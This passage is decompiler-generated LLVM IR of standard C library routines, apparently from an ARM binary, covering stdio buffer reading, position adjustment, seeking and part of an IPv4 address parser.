  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17f44 = load i32, i32* @r4, align 4
  store i32 %v3_17f44, i32* %stack_var_-12, align 4
  %v0_17f48 = load i32, i32* %r0.global-to-local, align 4
  %v1_17f48 = inttoptr i32 %v0_17f48 to i16*
  %v2_17f48 = load i16, i16* %v1_17f48, align 2
  %v3_17f48 = zext i16 %v2_17f48 to i32
  %v1_17f4c = and i32 %v3_17f48, 4
  store i32 %v1_17f4c, i32* %r5.global-to-local, align 4
  %v2_17f4c = icmp eq i32 %v1_17f4c, 0
  store i32 %v0_17f48, i32* %r4.global-to-local, align 4
  br i1 %v2_17f4c, label %dec_label_pc_17f60, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_17f60:                               ; preds = %entry
  %v1_17f60 = icmp slt i32 %arg2, 0
  br i1 %v1_17f60, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_17f60
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_17f60, %bb18
  %v1_17f68 = add i32 %v0_17f48, 4
  %v2_17f68 = inttoptr i32 %v1_17f68 to i32*
  %v3_17f68 = load i32, i32* %v2_17f68, align 4
  store i32 %v3_17f68, i32* %r0.global-to-local, align 4
  %v1_17f6c = call i32 @__GI_read(i32 %v3_17f68)
  store i32 %v1_17f6c, i32* %r0.global-to-local, align 4
  %v5_17f74 = icmp sgt i32 %v1_17f6c, 0
  br i1 %v5_17f74, label %.thread7, label %dec_label_pc_17f78

dec_label_pc_17f78:                               ; preds = %bb19
  %v2_17f70 = icmp eq i32 %v1_17f6c, 0
  %v0_17f78 = load i32, i32* %r4.global-to-local, align 4
  %v1_17f78 = inttoptr i32 %v0_17f78 to i16*
  %v2_17f78 = load i16, i16* %v1_17f78, align 2
  br i1 %v2_17f70, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17f78
  %v2_17f7c = or i16 %v2_17f78, 4
  store i16 %v2_17f7c, i16* %v1_17f78, align 2
  %v1_17f98.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17f78
  %v2_17f80 = or i16 %v2_17f78, 8
  store i16 %v2_17f80, i16* %v1_17f78, align 2
  %v1_17f8c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17f8c, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17f98 = phi i32 [ %v1_17f98.pre, %bb20 ], [ 0, %bb ], [ %v1_17f6c, %bb19 ], [ %v1_17f8c, %bb21 ]
  %v2_17f94 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17f94, i32* @r4, align 4
  ret i32 %v1_17f98

; uselistorder directives
  uselistorder i16 %v2_17f78, { 1, 0 }
  uselistorder i32 %v1_17f6c, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__GI_read, { 1, 2, 0 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_adjust_position(i16* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17f9c = load i32, i32* @r4, align 4
  store i32 %v3_17f9c, i32* %stack_var_-12, align 4
  %v3_17fa0 = load i16, i16* %arg1, align 2
  %v4_17fa0 = zext i16 %v3_17fa0 to i32
  store i32 %v4_17fa0, i32* @ip, align 4
  %tmp17 = urem i16 %v3_17fa0, 4
  %v1_17fa4 = zext i16 %tmp17 to i32
  store i32 %v1_17fa4, i32* %r2.global-to-local, align 4
  %v2_17fa4 = icmp eq i16 %tmp17, 0
  br i1 %v2_17fa4, label %bb, label %dec_label_pc_17fb8

bb:                                               ; preds = %entry
  br label %bb14

dec_label_pc_17fb8:                               ; preds = %entry
  %v1_17fb8 = add nsw i32 %v1_17fa4, -1
  %v7_17fb8 = icmp eq i16 %tmp17, 1
  br i1 %v7_17fb8, label %bb14, label %dec_label_pc_17fc0

dec_label_pc_17fc0:                               ; preds = %dec_label_pc_17fb8
  %v1_17fc0 = and i32 %v4_17fa0, 2048
  %v2_17fc0 = icmp eq i32 %v1_17fc0, 0
  br i1 %v2_17fc0, label %bb14, label %dec_label_pc_17fc8

dec_label_pc_17fc8:                               ; preds = %dec_label_pc_17fc0
  %v7_17fc8 = icmp eq i32 %v1_17fb8, 2
  br i1 %v7_17fc8, label %dec_label_pc_1804c, label %dec_label_pc_17fd0

dec_label_pc_17fd0:                               ; preds = %dec_label_pc_17fc8
  %v2_17fd0 = add i32 %tmp, 40
  %v3_17fd0 = inttoptr i32 %v2_17fd0 to i32*
  %v4_17fd0 = load i32, i32* %v3_17fd0, align 4
  store i32 %v4_17fd0, i32* %r3.global-to-local, align 4
  %v2_17fd4 = icmp eq i32 %v4_17fd0, 0
  br i1 %v2_17fd4, label %dec_label_pc_17fdc, label %dec_label_pc_1804c

dec_label_pc_17fdc:                               ; preds = %dec_label_pc_17fd0
  %v2_17fdc = add i32 %tmp, 44
  %v3_17fdc = inttoptr i32 %v2_17fdc to i32*
  %v4_17fdc = load i32, i32* %v3_17fdc, align 4
  store i32 %v4_17fdc, i32* %r3.global-to-local, align 4
  %v2_17fe0 = add i32 %tmp, 3
  %v3_17fe0 = inttoptr i32 %v2_17fe0 to i8*
  %v4_17fe0 = load i8, i8* %v3_17fe0, align 1
  %v5_17fe0 = zext i8 %v4_17fe0 to i32
  store i32 %v5_17fe0, i32* %r2.global-to-local, align 4
  %v2_17fe4 = icmp eq i32 %v4_17fdc, 0
  br i1 %v2_17fe4, label %.thread1, label %bb13

.thread1:                                         ; preds = %dec_label_pc_17fdc
  %v1_17fec3 = sub nsw i32 0, %v5_17fe0
  br label %bb14

bb13:                                             ; preds = %dec_label_pc_17fdc
  %v3_17fe8 = add i32 %tmp, 2
  %v4_17fe8 = inttoptr i32 %v3_17fe8 to i8*
  %v5_17fe8 = load i8, i8* %v4_17fe8, align 1
  %v6_17fe8 = zext i8 %v5_17fe8 to i32
  store i32 %v6_17fe8, i32* %r3.global-to-local, align 4
  %sum = add nuw nsw i32 %v6_17fe8, %v5_17fe0
  %v3_17ff0 = sub nsw i32 0, %sum
  br label %bb14

bb14:                                             ; preds = %bb, %.thread1, %dec_label_pc_17fc0, %dec_label_pc_17fb8, %bb13
  %v1_18004 = phi i32 [ %v1_17fec3, %.thread1 ], [ %v1_17fb8, %dec_label_pc_17fc0 ], [ %v1_17fb8, %dec_label_pc_17fb8 ], [ 0, %bb ], [ %v3_17ff0, %bb13 ]
  %v1_17ff4 = and i32 %v4_17fa0, 64
  %v2_17ff4 = icmp eq i32 %v1_17ff4, 0
  %v2_17ff8 = add i32 %tmp, 16
  %v3_17ff8 = inttoptr i32 %v2_17ff8 to i32*
  %v4_17ff8 = load i32, i32* %v3_17ff8, align 4
  store i32 %v4_17ff8, i32* %r3.global-to-local, align 4
  %storemerge.in.in.v = select i1 %v2_17ff4, i32 20, i32 8
  %storemerge.in.in = add i32 %storemerge.in.in.v, %tmp
  %storemerge.in = inttoptr i32 %storemerge.in.in to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v2_18004 = sub i32 %v1_18004, %v4_17ff8
  store i32 %v2_18004, i32* %r3.global-to-local, align 4
  %v1_18008 = inttoptr i32 %arg2 to i32*
  %v2_18008 = load i32, i32* %v1_18008, align 4
  store i32 %v2_18008, i32* %r0.global-to-local, align 4
  %v3_18008 = add i32 %arg2, 4
  %v4_18008 = inttoptr i32 %v3_18008 to i32*
  %v5_18008 = load i32, i32* %v4_18008, align 4
  %v2_1800c = add i32 %storemerge, %v2_18004
  store i32 %v2_1800c, i32* %r4.global-to-local, align 4
  %v2_18010 = sub i32 %v2_18008, %v2_1800c
  store i32 %v2_18010, i32* %r2.global-to-local, align 4
  %v2_18014 = and i32 %v2_1800c, 1073741824
  %v3_18014 = icmp ne i32 %v2_18014, 0
  %v4_18014 = ashr i32 %v2_1800c, 31
  %v6_18014 = icmp eq i1 %v3_18014, false
  %v7_18014 = sub i32 %v5_18008, %v4_18014
  %v9_18014 = sext i1 %v6_18014 to i32
  %v10_18014 = add i32 %v7_18014, %v9_18014
  store i32 %v10_18014, i32* %r3.global-to-local, align 4
  %v2_18018 = sub i32 %v10_18014, %v5_18008
  %v4_18018 = xor i32 %v10_18014, %v5_18008
  %v5_18018 = xor i32 %v2_18018, %v10_18014
  %v6_18018 = and i32 %v5_18018, %v4_18018
  %v7_18018 = icmp slt i32 %v6_18018, 0
  %v8_18018 = icmp slt i32 %v2_18018, 0
  %v9_18018 = icmp eq i32 %v10_18014, %v5_18008
  store i32 %v2_18010, i32* %v1_18008, align 4
  %v5_1801c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v5_1801c, i32* %v4_18008, align 4
  %v3_18020 = xor i1 %v8_18018, %v7_18018
  %v4_18020 = or i1 %v9_18018, %v3_18020
  br i1 %v4_18020, label %dec_label_pc_18024, label %dec_label_pc_18030

dec_label_pc_18024:                               ; preds = %bb14
  br i1 %v9_18018, label %dec_label_pc_18028, label %dec_label_pc_18034thread-pre-split

dec_label_pc_18028:                               ; preds = %dec_label_pc_18024
  %v0_18028 = load i32, i32* %r2.global-to-local, align 4
  %v1_18028 = load i32, i32* %r0.global-to-local, align 4
  %tmp18 = icmp ugt i32 %v0_18028, %v1_18028
  br i1 %tmp18, label %dec_label_pc_18030, label %dec_label_pc_18034thread-pre-split

dec_label_pc_18030:                               ; preds = %dec_label_pc_18028, %bb14
  %v0_18030 = load i32, i32* %r4.global-to-local, align 4
  %v1_18030 = sub i32 0, %v0_18030
  store i32 %v1_18030, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18034

dec_label_pc_18034thread-pre-split:               ; preds = %dec_label_pc_18028, %dec_label_pc_18024
  %v0_18034.pr = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18034

dec_label_pc_18034:                               ; preds = %dec_label_pc_18034thread-pre-split, %dec_label_pc_18030
  %v0_18034 = phi i32 [ %v0_18034.pr, %dec_label_pc_18034thread-pre-split ], [ %v1_18030, %dec_label_pc_18030 ]
  %v1_18034 = icmp slt i32 %v0_18034, 0
  br i1 %v1_18034, label %dec_label_pc_1803c, label %dec_label_pc_18050

dec_label_pc_1803c:                               ; preds = %dec_label_pc_18034
  %v0_1803c = call i32 @__GI___errno_location()
  store i32 %v0_1803c, i32* %r0.global-to-local, align 4
  store i32 75, i32* %r3.global-to-local, align 4
  %v2_18044 = inttoptr i32 %v0_1803c to i32*
  store i32 75, i32* %v2_18044, align 4
  %v0_18050.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18050

dec_label_pc_1804c:                               ; preds = %dec_label_pc_17fd0, %dec_label_pc_17fc8
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_18050

dec_label_pc_18050:                               ; preds = %dec_label_pc_18034, %dec_label_pc_1803c, %dec_label_pc_1804c
  %v0_18050 = phi i32 [ %v0_18034, %dec_label_pc_18034 ], [ %v0_18050.pre, %dec_label_pc_1803c ], [ -1, %dec_label_pc_1804c ]
  store i32 %v0_18050, i32* %r0.global-to-local, align 4
  %v2_18058 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18058, i32* @r4, align 4
  ret i32 %v0_18050

; uselistorder directives
  uselistorder i32 %v0_18050, { 1, 0 }
  uselistorder i1 %v9_18018, { 1, 0 }
  uselistorder i32 %v2_18018, { 1, 0 }
  uselistorder i32 %v10_18014, { 3, 0, 1, 2, 4 }
  uselistorder i32 %v5_18008, { 2, 0, 1, 3 }
  uselistorder i32 %tmp, { 0, 5, 1, 3, 2, 4, 6 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 1, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 3, 0, 4, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 4, 2, 3, 0 }
  uselistorder i16 4, { 2, 0, 1, 3 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_18050, { 2, 1, 0 }
  uselistorder label %bb14, { 4, 1, 2, 3, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_18060 = load i32, i32* @r4, align 4
  store i32 %v3_18060, i32* %stack_var_-8, align 4
  %v1_18064 = add i32 %arg1, 8
  %v1_18068 = inttoptr i32 %v1_18064 to i32*
  %v2_18068 = load i32, i32* %v1_18068, align 4
  %v3_18068 = add i32 %arg1, 12
  %v4_18068 = inttoptr i32 %v3_18068 to i32*
  %v5_18068 = load i32, i32* %v4_18068, align 4
  %v2_1806c = sub i32 %v5_18068, %v2_18068
  store i32 %v2_1806c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_18074 = inttoptr i32 %arg1 to i16*
  %v4_18074 = call i32 @__stdio_READ(i16* %v3_18074, i32 %v2_18068, i32 %v2_1806c)
  %v0_18078 = load i32, i32* @r4, align 4
  %v1_18078 = add i32 %v0_18078, 8
  %v2_18078 = inttoptr i32 %v1_18078 to i32*
  %v3_18078 = load i32, i32* %v2_18078, align 4
  store i32 %v3_18078, i32* %r2.global-to-local, align 4
  %v2_1807c = add i32 %v3_18078, %v4_18074
  %v2_18080 = add i32 %v0_18078, 20
  %v3_18080 = inttoptr i32 %v2_18080 to i32*
  store i32 %v2_1807c, i32* %v3_18080, align 4
  %v0_18084 = load i32, i32* %r2.global-to-local, align 4
  %v1_18084 = load i32, i32* @r4, align 4
  %v2_18084 = add i32 %v1_18084, 16
  %v3_18084 = inttoptr i32 %v2_18084 to i32*
  store i32 %v0_18084, i32* %v3_18084, align 4
  %v2_18088 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_18088, i32* @r4, align 4
  ret i32 %v4_18074

; uselistorder directives
  uselistorder i32 %v4_18074, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_18090 = load i32, i32* @r4, align 4
  store i32 %v3_18090, i32* %stack_var_-12, align 4
  %v0_18094 = load i32, i32* @r0, align 4
  %v1_18094 = inttoptr i32 %v0_18094 to i16*
  %v2_18094 = load i16, i16* %v1_18094, align 2
  %v3_18094 = zext i16 %v2_18094 to i32
  store i32 %v3_18094, i32* %r3.global-to-local, align 4
  %v0_18098 = load i32, i32* @r1, align 4
  %v2_18098 = and i32 %v0_18098, %v3_18094
  %v4_18098 = icmp eq i32 %v2_18098, 0
  store i32 %v0_18094, i32* @r4, align 4
  br i1 %v4_18098, label %dec_label_pc_180a8, label %dec_label_pc_180b8

dec_label_pc_180a8:                               ; preds = %entry
  %v1_180a8 = and i32 %v3_18094, 2176
  %v2_180a8 = icmp eq i32 %v1_180a8, 0
  br i1 %v2_180a8, label %dec_label_pc_180b0, label %dec_label_pc_180c4

dec_label_pc_180b0:                               ; preds = %dec_label_pc_180a8
  %v2_180b0 = or i32 %v0_18098, %v3_18094
  store i32 %v2_180b0, i32* %r3.global-to-local, align 4
  %v1_180b4 = trunc i32 %v2_180b0 to i16
  store i16 %v1_180b4, i16* %v1_18094, align 2
  %v0_180b8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_180b8

dec_label_pc_180b8:                               ; preds = %entry, %dec_label_pc_180b0
  %v0_180b8 = phi i32 [ %v0_18094, %entry ], [ %v0_180b8.pre, %dec_label_pc_180b0 ]
  %v1_180b8 = inttoptr i32 %v0_180b8 to i16*
  %v2_180b8 = load i16, i16* %v1_180b8, align 2
  %v3_180b8 = zext i16 %v2_180b8 to i32
  store i32 %v3_180b8, i32* %r3.global-to-local, align 4
  %v1_180bc = and i32 %v3_180b8, 16
  store i32 %v1_180bc, i32* %r5.global-to-local, align 4
  %v2_180bc = icmp eq i32 %v1_180bc, 0
  br i1 %v2_180bc, label %dec_label_pc_180e4, label %dec_label_pc_180c4

dec_label_pc_180c4:                               ; preds = %dec_label_pc_180a8, %dec_label_pc_180b8
  %v0_180c4 = call i32 @__GI___errno_location()
  store i32 %v0_180c4, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_180cc = inttoptr i32 %v0_180c4 to i32*
  store i32 9, i32* %v2_180cc, align 4
  br label %dec_label_pc_180d0

dec_label_pc_180d0:                               ; preds = %dec_label_pc_180ec, %dec_label_pc_180c4
  %v0_180d0 = load i32, i32* @r4, align 4
  %v1_180d0 = inttoptr i32 %v0_180d0 to i16*
  %v2_180d0 = load i16, i16* %v1_180d0, align 2
  %v3_180d0 = zext i16 %v2_180d0 to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_180d8 = or i32 %v3_180d0, 8
  store i32 %v1_180d8, i32* %r3.global-to-local, align 4
  %v1_180dc = trunc i32 %v1_180d8 to i16
  store i16 %v1_180dc, i16* %v1_180d0, align 2
  %v1_18124.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1811c

dec_label_pc_180e4:                               ; preds = %dec_label_pc_180b8
  %v1_180e4 = and i32 %v3_180b8, 64
  %v2_180e4 = icmp eq i32 %v1_180e4, 0
  br i1 %v2_180e4, label %dec_label_pc_1810c, label %dec_label_pc_180ec

dec_label_pc_180ec:                               ; preds = %dec_label_pc_180e4
  %v0_180ec = call i32 @__stdio_wcommit()
  store i32 %v0_180ec, i32* %r0.global-to-local, align 4
  %v2_180f0 = icmp eq i32 %v0_180ec, 0
  br i1 %v2_180f0, label %dec_label_pc_180f8, label %dec_label_pc_180d0

dec_label_pc_180f8:                               ; preds = %dec_label_pc_180ec
  %v0_180f8 = load i32, i32* @r4, align 4
  %v1_180f8 = inttoptr i32 %v0_180f8 to i16*
  %v2_180f8 = load i16, i16* %v1_180f8, align 2
  %v3_180f8 = zext i16 %v2_180f8 to i32
  store i32 %v3_180f8, i32* %r3.global-to-local, align 4
  %v1_180fc = add i32 %v0_180f8, 8
  %v2_180fc = inttoptr i32 %v1_180fc to i32*
  %v3_180fc = load i32, i32* %v2_180fc, align 4
  %v1_18100 = and i32 %v3_180f8, 65471
  store i32 %v1_18100, i32* %r3.global-to-local, align 4
  %v2_18104 = add i32 %v0_180f8, 28
  %v3_18104 = inttoptr i32 %v2_18104 to i32*
  store i32 %v3_180fc, i32* %v3_18104, align 4
  %v0_18108 = load i32, i32* %r3.global-to-local, align 4
  %v1_18108 = trunc i32 %v0_18108 to i16
  %v2_18108 = load i32, i32* @r4, align 4
  %v3_18108 = inttoptr i32 %v2_18108 to i16*
  store i16 %v1_18108, i16* %v3_18108, align 2
  %v0_1810c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1810c

dec_label_pc_1810c:                               ; preds = %dec_label_pc_180e4, %dec_label_pc_180f8
  %v2_18114 = phi i32 [ %v0_180b8, %dec_label_pc_180e4 ], [ %v0_1810c.pre, %dec_label_pc_180f8 ]
  %v1_1810c = inttoptr i32 %v2_18114 to i16*
  %v2_1810c = load i16, i16* %v1_1810c, align 2
  %v3_1810c = zext i16 %v2_1810c to i32
  %v1_18110 = or i32 %v3_1810c, 1
  store i32 %v1_18110, i32* %r3.global-to-local, align 4
  %v1_18114 = trunc i32 %v1_18110 to i16
  store i16 %v1_18114, i16* %v1_1810c, align 2
  %v0_18118 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_18118, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1811c

dec_label_pc_1811c:                               ; preds = %dec_label_pc_180d0, %dec_label_pc_1810c
  %v1_18124 = phi i32 [ %v1_18124.pre, %dec_label_pc_180d0 ], [ %v0_18118, %dec_label_pc_1810c ]
  %v2_18120 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_18120, i32* @r4, align 4
  ret i32 %v1_18124

; uselistorder directives
  uselistorder i32 %v3_18094, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 ()* @__stdio_wcommit, { 2, 5, 4, 3, 1, 0 }
  uselistorder i32 2176, { 1, 0 }
  uselistorder label %dec_label_pc_1811c, { 1, 0 }
  uselistorder label %dec_label_pc_1810c, { 1, 0 }
  uselistorder label %dec_label_pc_180c4, { 1, 0 }
  uselistorder label %dec_label_pc_180b8, { 1, 0 }
}

define i32 @__stdio_seek(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg2 to i32
  %v2_18134 = load i32, i32* %arg2, align 4
  %v3_18134 = add i32 %tmp, 4
  %v4_18134 = inttoptr i32 %v3_18134 to i32*
  %v5_18134 = load i32, i32* %v4_18134, align 4
  %v1_18138 = add i32 %arg1, 4
  %v2_18138 = inttoptr i32 %v1_18138 to i32*
  %v3_18138 = load i32, i32* %v2_18138, align 4
  store i32 %tmp, i32* @r4, align 4
  %v4_18140 = call i32 @__GI_lseek64(i32 %v3_18138, i32 %tmp, i32 %v2_18134, i32 %v5_18134)
  %v1_18144 = icmp slt i32* %arg2, null
  br i1 %v1_18144, label %bb13, label %bb

bb:                                               ; preds = %entry
  %v3_1814c5 = load i32, i32* @r4, align 4
  %v4_1814c6 = inttoptr i32 %v3_1814c5 to i32*
  store i32 %v4_18140, i32* %v4_1814c6, align 4
  %v6_1814c7 = add i32 %v3_1814c5, 4
  %v7_1814c8 = inttoptr i32 %v6_1814c7 to i32*
  store i32 %tmp, i32* %v7_1814c8, align 4
  br label %bb13

bb13:                                             ; preds = %entry, %bb
  %storemerge = phi i32 [ 0, %bb ], [ %v4_18140, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %tmp, { 0, 3, 2, 1 }
  uselistorder i32* null, { 2, 0, 3, 4, 1, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 24, 25, 22, 23, 21, 20, 19, 26, 27, 28, 5 }
  uselistorder label %bb13, { 1, 0 }
}

define i32 @inet_pton4(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r1.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_18164 = load i32, i32* @r4, align 4
  %v6_18164 = load i32, i32* @r5, align 4
  %v15_18164 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @r4, align 4
  store i32 0, i32* @ip, align 4
  store i32 0, i32* @lr, align 4
  %v2_1817c = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_1817c, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 10, i32* %r7.global-to-local, align 4
  store i32 1, i32* %r6.global-to-local, align 4
  store i32 0, i32* %stack_var_-28, align 4
  %v0_181f41 = load i32, i32* @r0, align 4
  %v1_181f42 = inttoptr i32 %v0_181f41 to i8*
  %v2_181f43 = load i8, i8* %v1_181f42, align 1
  %v3_181f44 = zext i8 %v2_181f43 to i32
  store i32 %v3_181f44, i32* @r3, align 4
  %v2_181f85 = icmp eq i8 %v2_181f43, 0
  store i1 %v2_181f85, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181f85, label %dec_label_pc_18204, label %dec_label_pc_18194

dec_label_pc_18194:                               ; preds = %entry, %dec_label_pc_181f4.backedge
  %v0_18198 = phi i32 [ %v0_181f4, %dec_label_pc_181f4.backedge ], [ %v0_181f41, %entry ]
  %v0_181d0 = phi i32 [ %v3_181f4, %dec_label_pc_181f4.backedge ], [ %v3_181f44, %entry ]
  %v2_181a4.in = phi i32 [ %v3_181f4, %dec_label_pc_181f4.backedge ], [ %v3_181f44, %entry ]
  %v2_181a4 = add nsw i32 %v2_181a4.in, -48
  %v2_18194 = icmp ugt i32 %v2_181a4, 8
  %v7_18194 = icmp eq i32 %v2_181a4, 9
  store i1 %v7_18194, i1* %cpsr_z.global-to-local, align 1
  %v1_18198 = add i32 %v0_18198, 1
  store i32 %v1_18198, i32* %r0.global-to-local, align 4
  %v2_1819c = xor i1 %v7_18194, true
  %v3_1819c = and i1 %v2_18194, %v2_1819c
  br i1 %v3_1819c, label %dec_label_pc_181d0, label %dec_label_pc_181a0

dec_label_pc_181a0:                               ; preds = %dec_label_pc_18194
  %v0_181a0 = load i32, i32* %r1.global-to-local, align 4
  %v1_181a0 = inttoptr i32 %v0_181a0 to i8*
  %v2_181a0 = load i8, i8* %v1_181a0, align 1
  %v3_181a0 = zext i8 %v2_181a0 to i32
  %v0_181a4 = load i32, i32* %r7.global-to-local, align 4
  %v3_181a4 = mul i32 %v0_181a4, %v3_181a0
  %v4_181a4 = add i32 %v3_181a4, %v2_181a4
  store i32 %v4_181a4, i32* @r3, align 4
  %v2_181a8 = icmp ugt i32 %v4_181a4, 254
  %v7_181a8 = icmp eq i32 %v4_181a4, 255
  store i1 %v7_181a8, i1* %cpsr_z.global-to-local, align 1
  %v2_181ac = xor i1 %v7_181a8, true
  %v3_181ac = and i1 %v2_181a8, %v2_181ac
  br i1 %v3_181ac, label %dec_label_pc_18228, label %dec_label_pc_181b0

dec_label_pc_181b0:                               ; preds = %dec_label_pc_181a0
  %v0_181b0 = load i32, i32* @lr, align 4
  %v2_181b0 = icmp eq i32 %v0_181b0, 0
  store i1 %v2_181b0, i1* %cpsr_z.global-to-local, align 1
  %v1_181b4 = trunc i32 %v4_181a4 to i8
  store i8 %v1_181b4, i8* %v1_181a0, align 1
  %v0_181b8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_181b8, label %dec_label_pc_181bc, label %dec_label_pc_181f4.backedge

dec_label_pc_181bc:                               ; preds = %dec_label_pc_181b0
  %v0_181bc = load i32, i32* @ip, align 4
  %v1_181bc = add i32 %v0_181bc, 1
  store i32 %v1_181bc, i32* @ip, align 4
  %v7_181c0 = icmp eq i32 %v1_181bc, 4
  store i1 %v7_181c0, i1* %cpsr_z.global-to-local, align 1
  %v0_181c4 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_181c4, i32* @lr, align 4
  %v8_181c8 = icmp sgt i32 %v1_181bc, 4
  br i1 %v8_181c8, label %dec_label_pc_18228, label %dec_label_pc_181f4.backedge

dec_label_pc_181d0:                               ; preds = %dec_label_pc_18194
  %v7_181d0 = icmp eq i32 %v0_181d0, 46
  %v1_181d8 = load i32, i32* @lr, align 4
  %v2_181d8 = urem i32 %v1_181d8, 2
  %storemerge12 = select i1 %v7_181d0, i32 %v2_181d8, i32 0
  store i32 %storemerge12, i32* @r3, align 4
  %v2_181dc = icmp eq i32 %storemerge12, 0
  store i1 %v2_181dc, i1* %cpsr_z.global-to-local, align 1
  %v0_181e0 = load i32, i32* @r5, align 4
  store i32 %v0_181e0, i32* @lr, align 4
  br i1 %v2_181dc, label %dec_label_pc_18228, label %dec_label_pc_181e8

dec_label_pc_181e8:                               ; preds = %dec_label_pc_181d0
  %v0_181e8 = load i32, i32* @ip, align 4
  %v7_181e8 = icmp eq i32 %v0_181e8, 4
  store i1 %v7_181e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_181e8, label %dec_label_pc_18228, label %dec_label_pc_181f0

dec_label_pc_181f0:                               ; preds = %dec_label_pc_181e8
  %v1_181f0 = trunc i32 %v0_181e0 to i8
  %v2_181f0 = load i32, i32* %r1.global-to-local, align 4
  %v3_181f0 = add i32 %v2_181f0, 1
  %v4_181f0 = inttoptr i32 %v3_181f0 to i8*
  store i8 %v1_181f0, i8* %v4_181f0, align 1
  %v5_181f0 = load i32, i32* %r1.global-to-local, align 4
  %v6_181f0 = add i32 %v5_181f0, 1
  store i32 %v6_181f0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_181f4.backedge

dec_label_pc_181f4.backedge:                      ; preds = %dec_label_pc_181f0, %dec_label_pc_181b0, %dec_label_pc_181bc
  %v0_181f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_181f4 = inttoptr i32 %v0_181f4 to i8*
  %v2_181f4 = load i8, i8* %v1_181f4, align 1
  %v3_181f4 = zext i8 %v2_181f4 to i32
  store i32 %v3_181f4, i32* @r3, align 4
  %v2_181f8 = icmp eq i8 %v2_181f4, 0
  store i1 %v2_181f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_181f8, label %dec_label_pc_181f4.dec_label_pc_18204_crit_edge, label %dec_label_pc_18194

dec_label_pc_181f4.dec_label_pc_18204_crit_edge:  ; preds = %dec_label_pc_181f4.backedge
  %v0_18204.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_18204

dec_label_pc_18204:                               ; preds = %dec_label_pc_181f4.dec_label_pc_18204_crit_edge, %entry
